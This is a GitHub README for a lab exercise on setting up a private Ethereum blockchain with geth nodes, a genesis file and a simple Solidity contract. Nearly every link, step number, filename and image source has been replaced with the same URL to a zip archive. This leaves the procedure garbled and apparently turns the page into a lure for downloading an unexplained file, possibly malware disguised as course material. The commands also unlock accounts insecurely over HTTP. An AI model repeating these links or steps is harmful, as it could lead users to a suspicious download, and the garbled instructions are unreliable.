
# https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
## CREATING A PRIVATE BLOCKCHAIN
## AIM
To create a Private Blockchain and to add nodes, create accounts, transfer Ether into it by creating
and deploying Smart contract.
## PROCEDURE:

```
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip to https https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip and download the software for windows. While installing select
both geth and development tools.
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip check whether the geth is installed ,run “geth” command in your command prompt.
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip create a Private Blockchain , we must create a genesis block.
In your command prompt, create a directory go-ethereum.
mkdir go-ethereum
cd go-ethereum
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip two nodes inside go-ethereum.
mkdir node1
mkdir node2
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip vs code using “code .”
To create account for two nodes
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip terminal in vs code and change directory to node1.
cd node1
geth --datadir "./data" account new
Save the public address and password of node1 in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
3
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip the same procedures for node2
cd ..
cd node2
geth --datadir "./data" account new
Save the public address and password of node2 in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
To create a genesis block
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip a file named “https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip” inside go-ethereum.
 Replace {Chain id } with your own chain id and check whether it exists or not using https
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
 Replace initial signer address and firstnode address with node1 address saved in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
 And second node with node2 address saved in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
 Then replace balance as “3000000000000000000” for both nodes.
To configure both nodes using genesis block
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip directory to node1 in terminal and run this command.
geth --datadir ./data init https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip terminal and cd to node2 and run the same.
11. Again split terminal and create bootnode.
mkdir bnode
cd bnode
12. To generate key
bootnode -genkey https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
bootnode -nodekey https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip verbosity 7 -addr "127.0.0.1 30301"
4
13. save the enode value in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip node1 and node2
To start node1 > geth --datadir "./data" --port 30304 --bootnodes enode //{ YOUR_VALUE } --
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip 8547 --ipcdisable --allow-insecure-unlock --http https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip"https
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip" https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip web3,eth,debug,personal,net --networkid { NETWORK_ID } --
unlock { ADDRESS_NODE1 } --password { PASSWORD_FILE_NAME_EXTENSION } --
mine https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip { SIGNER_ADDRESS }
To start node2 > geth --datadir "./data" --port 30306 --bootnodes enode //{ YOUR_VALUE } -
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip 8546 --networkid { NETWORK_ID } --unlock { ADDRESS_NODE2 } --password
{ PASSWORD_FILE_WITH_EXTENSION }
 Replace Node1 address in {signer address} and {address node1} and enode value with
{your value}
 {Network id} is your chain id given in https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
 Create https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip undernode1 and node2 and enter the password in it.
 Replace https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip with { PASSWORD_FILE_NAME_EXTENSION }.
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip to https https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip and in left pane click deploy and run transactions icon.
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip the environment to Custom-External HTTP Provider
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip on file and under contract, create new file named “https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip”
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip the file and go to deploy tab and click deploy.
https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip has deployed and added to blockchain.
```
## PROGRAM
```
#Genesis file https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
{
"config" {
"chainId" 878787,
"homesteadBlock" 0,
"eip150Block" 0,
"eip155Block" 0,
"eip158Block" 0,
"byzantiumBlock" 0,
"constantinopleBlock" 0,
"petersburgBlock" 0,
"istanbulBlock" 0,
"berlinBlock" 0,
"clique" {
"period" 5,
"epoch" 30000
}
},
"difficulty" "1",
"gasLimit" "8000000",
"extradata"
"0x00000000000000000000000000000000000000000000000000000000000000001d09cd3F475a65
7381b223A9c91029865b27E0270000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000",
"alloc" {
"1d09cd3F475a657381b223A9c91029865b27E027" { "balance" "3000000000000000000" },
"e503980FB9E4D17048b973B0ee01759DcF2d7879" { "balance" "3000000000000000000" }
}
}
```
## Smart Contract https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip
```
//SPDX-License-Identifier MIT
pragma solidity ^0.8.19;
contract New{
string name;
function setName(string memory _name) public {
name= _name;
}
function getName() public view returns (string memory){
return name;
}
}
```
## OUTPUT
# Deploying Transaction in Remix
<img width="1920" height="1080" alt="Screenshot 2025-09-17 165643" src="https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip" />
<img width="1920" height="1080" alt="Screenshot 2025-09-18 092001" src="https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip" />

# Contract Creation Output in Command Prompt
<img width="1920" height="1080" alt="Screenshot 2025-09-18 092056" src="https://raw.githubusercontent.com/Yugabharathi91/Blockchain-for-business/main/mollycosset/business-for-Blockchain-3.3.zip" />


## RESULT: 
Thus, the Private Blockchain is created, nodes are added with accounts, and Ether is transferred
into it by creating and deploying Smart contract successfully
